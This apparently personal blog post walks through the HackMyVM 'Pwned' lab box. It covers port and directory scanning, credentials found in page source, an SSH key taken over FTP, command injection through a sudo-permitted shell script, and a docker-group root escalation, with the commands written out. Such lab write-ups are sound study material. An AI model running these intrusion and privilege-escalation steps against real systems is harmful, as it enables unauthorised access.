---
title: Pwned - HackMyVM Walkthrough
author: Degr4ne
date: 2021-09-18 12:00:00 
categories: [HackMyVM]
tags: [ftp,sudo]
math: false
mermaid: false
image:
  src: /assets/img/HMVM/logo.png
  width: 216
  height: 213
---
Hello guys, today we are gonna do a walkthrough on `Pwned` the box from [HackMyVM](https://hackmyvm.eu) and maded by [annlynn](https://hackmyvm.eu/profile/?user=annlynn), this box is rated easy, in my case with an IP address of `192.168.56.131`. Without much say let’s jump in.

We will start with `nmap` to know which ports are open and what services are running.

```console
$ nmap -sC -sV -oN info 192.168.56.131           

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!

```
3 ports are open : FTP, SSH, and HTTP.
I tried login in ftp with user `anonymous` but this user isn't allowed,we could have tried enumerate SSH port but we need credentials, meanwhile on the 80 port it displays a message from the hacker who hacked our server, looking at the source code I found a comment but it wasn’t helpful anyway.

![01-web](/assets/img/HMVM/Pwned/01-web.png)

I decided to run `gobuster` to make a directory brute forcing.
``` console
$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.131 -t 50 -o normalFuzz

/nothing              (Status: 301) [Size: 318] [--> http://192.168.56.131/nothing/]
/server-status        (Status: 403) [Size: 279]                                     
/hidden_text          (Status: 301) [Size: 322] [--> http://192.168.56.131/hidden_text/]

```
In the `/nothing` directory there's nothing useful, but  `/hidden_text`  is a directory listing and there a wordlist `secret.dic`.

![02-secret](/assets/img/HMVM/Pwned/02-secret.png)

So I downloaded using wget command.
`wget http://192.168.56.131/hidden_text/secret.dic`

And ran gobuster using `secret.dic` like wordlist.
```console
$ gobuster dir -w secret.dic -u http://192.168.56.131/ -t 50            

//pwned.vuln          (Status: 301) [Size: 321] [--> http://192.168.56.131/pwned.vuln/]
```

![03-login](/assets/img/HMVM/Pwned/03-login.png)

Looking at the source code of the login page, it shows a php code with credentials.

![04-credentials](/assets/img/HMVM/Pwned/04-credentials.png)

We can use these credentials to login via FTP.

User | Password
-|-
ftpuser | B0ss_B!TcH

Once logged in, We found `share` directory and into there are two files so I downloaded the files using the above commands.
```
prompt off
mget *
```
![05-ftp](/assets/img/HMVM/Pwned/05-ftp.png)

We noticed that there is an `id_rsa` file and a note talking about `ariana`. Changing the permission of the id_rsa with `chmod 600 id_rsa`, we can try to logging with the user ariana and the id_rsa by SSH service. 

Running `sudo -l` with the user ariana like the screenshot above. We see that ariana can run the the `messenger.sh` script like `selena` without password.

![06-sudo](/assets/img/HMVM/Pwned/06-sudo.png)

Analyzing the code of `messenger.sh`, I noticed that the script executes the value that we enter for `$msg`.
```bash
#!/bin/bash

clear
echo "Welcome to linux.messenger "
		echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
		echo ""
echo "$users"
		echo ""
read -p "Enter username to send message : " name 
		echo ""
read -p "Enter message for $name :" msg
		echo ""
echo "Sending message to $name "

$msg 2> /dev/null

		echo ""
echo "Message sent to $name :) "
		echo ""
```
So let's run a bash.

![07-script](/assets/img/HMVM/Pwned/07-script.png)

But we have to do it like the user `selena`:
```console
$ sudo -u selena /home/messenger.sh
```
With the command `id`, we notice that selena is in the docker group.

![08-id](/assets/img/HMVM/Pwned/08-id.png) 

So let's  use [GTFOShell](https://github.com/Degr4ne/GTFOShell) a tool that help us to search information on GTFOBins in terminal.

![09-gtfoshell](/assets/img/HMVM/Pwned/09-gtfoshell.png)

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

And voila!! we are root.

![10-root](/assets/img/HMVM/Pwned/10-root.png)

That’s it for now guys. Until next time.
